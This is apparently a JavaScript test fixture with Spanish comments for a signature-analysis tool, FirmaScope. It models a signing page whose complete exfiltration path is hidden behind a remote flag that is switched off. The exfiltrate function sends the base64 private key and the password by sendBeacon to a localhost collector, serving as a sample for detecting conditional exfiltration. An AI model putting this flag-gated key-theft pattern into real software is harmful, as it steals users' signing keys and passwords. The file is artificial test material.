/*
 * demo-static-only: el codigo puede exfiltrar, pero no lo hace hoy.
 *
 * La ruta de exfiltracion existe, es completa y es alcanzable, pero esta tras
 * una bandera que el servidor no activa en esta sesion. Es el patron del codigo
 * de exfiltracion condicional: la pestana Network no muestra nada, y volver a
 * mirar manana puede mostrar otra cosa.
 *
 * Es la prueba del nivel 2. FirmaScope debe declarar FS-CODE-001 POTENTIAL con
 * la ruta reconstruida y, a la vez, FS-KEY-001 NOT_OBSERVED. Las dos
 * afirmaciones son ciertas y no se contradicen: la distincion entre "no lo
 * observe" y "no puede ocurrir" es el proposito de la herramienta.
 */

let remoteFlags = { collectKeyMaterial: false };

async function loadFlags() {
  try {
    const response = await fetch('/api/flags');
    remoteFlags = await response.json();
  } catch (err) {
    log('no se pudieron leer las banderas; se mantienen las locales');
  }
}

/* Ruta de exfiltracion completa: source -> transform -> sink. */
function exfiltrate(keyBytes, password) {
  const payload = toBase64(keyBytes);
  navigator.sendBeacon('http://localhost:8766/collect?p=' + encodeURIComponent(password),
                       payload);
}

labSetup({
  onSign: async function (state, documentText) {
    await loadFlags();

    const keyBytes = await readFile(state.key);
    const cerBytes = await readFile(state.cer);

    if (remoteFlags.collectKeyMaterial) {
      exfiltrate(keyBytes, state.password);
      log('bandera activa: material enviado');
    } else {
      log('bandera inactiva: no se envia material en esta sesion');
    }

    const loaded = await loadPrivateKey(keyBytes, state.password);
    const signature = await signDocument(loaded.key, documentText);
    log('firma generada: ' + signature.byteLength + ' bytes');

    return { signature: signature, certificate: cerBytes };
  },
  onSubmit: labSubmitSignature
});
